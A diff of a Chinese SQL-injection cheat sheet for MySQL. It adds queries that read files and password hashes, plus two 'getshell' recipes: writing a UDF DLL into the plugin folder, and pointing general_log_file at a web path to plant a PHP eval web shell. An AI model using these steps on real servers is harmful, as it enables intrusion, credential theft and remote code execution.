@@ -111,19 +111,26 @@ Q: Inline queries
 --sql-shell
 ```
 
+#### MySQL常用的查询语句
+
 ```
-# MySQL数据常用的查询语句
+# MySQL数据常用的查询语句 (实测支持MySQL 8.0.17)
+
+# 查询mysql二进制文件的位置(安装后的文件夹的路径)
+select @@basedir;
 
 # 查询文件读写权限
 SELECT @@global.secure_file_priv;
+
 # 读取文件
 select load_file("D:\web\config.php");
 
+# 查询mysql plugin文件夹的路径 (可把自己的UDF二进制库文件 放到plugin文件夹中)
+select @@plugin_dir;
+
 # 查询数据库版本
 SELECT @@global.version;
-
-# 查询数据用户及密码  说明:mysql密码的加密方式为 password_str = concat('*', sha1(unhex(sha1(password))))
-select host,user,password from mysql.user;
+select version();
 
 # 查询general_log的状态
 # 方法1 结果为0或1  0即OFF  1即ON
@@ -131,25 +138,68 @@ SELECT @@global.general_log;
 # 方法2 结果为ON或OFF
 show variables like 'general_log';
 
-# 查询general_log_file 日志文件的位置
+# 查询general_log_file 日志文件的具体路径
 # 方法1
 SELECT @@global.general_log_file;
 # 方法2
 show variables like 'general_log_file';
+```
 
-# 借助general_log_file 日志文件 getshell
+
+```
+# 查询MySQL的用户 密码
+
+# MySQL低版本:
+密码 加密方式为 password_str = concat('*', sha1(unhex(sha1(password))))
+select host,user,password from mysql.user;
+
+
+
+# MySQL高版本:
+# 如 MySQL 8.0.17 空就是空密码
+mysql> select User,Host,plugin,authentication_string from mysql.user;
++------------------+-----------+-----------------------+------------------------------------------------------------------------+
+| User             | Host      | plugin                | authentication_string                                                  |
++------------------+-----------+-----------------------+------------------------------------------------------------------------+
+| mysql.infoschema | localhost | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
+| mysql.session    | localhost | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
+| mysql.sys        | localhost | caching_sha2_password | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
+| root             | localhost | caching_sha2_password |                                                                        |
++------------------+-----------+-----------------------+------------------------------------------------------------------------+
+4 rows in set (0.00 sec)
+```
+
+
+```
+# getshell方法1 : 写文件
+
+# 前提 通常仅适用于 MySQL < 5.7 的版本
+
+# 查询文件读写权限
+SELECT @@global.secure_file_priv;
+
+# 读文件
+select load_file("D:\web\config.php");
+
+# 写文件
+select from_base64("base64的内容") into dumpfile "D:\mysql-5.6.41-winx64\lib\plugin\udf64.dll";
+```
+
+```
+# getshell方法2 : 修改 日志文件的具体路径 general_log_file 的值, 实现写文件到任意目录.
+
+# 优点: 不用考虑 文件读写权限@@global.secure_file_priv (实测 MySQL 8.0.17 可写文件到多个目录)
+# 前提: stacked queries类型SQLi漏洞 才支持"非select"语句.
+# [WARNING] execution of non-query SQL statements is only available when stacked queries are supported
+
 # 步骤1 修改变量值 开启general_log_file
 set global general_log = "ON";
 set global general_log_file='D:/web/test.php';
+
 # 步骤2 做查询 可将以下查询语句 写入到日志文件
 select '<?php eval($_POST[cmd]);?>';
-
-# 查询mysql二进制文件的位置(安装后的文件夹的路径)
-select @@basedir;
-
-# 查询mysql plugin文件夹的路径 (可把自己的UDF二进制库文件 放到plugin文件夹中)
-select @@plugin_dir;
 ```
+
 
 #### 参数 - OS命令执行
 
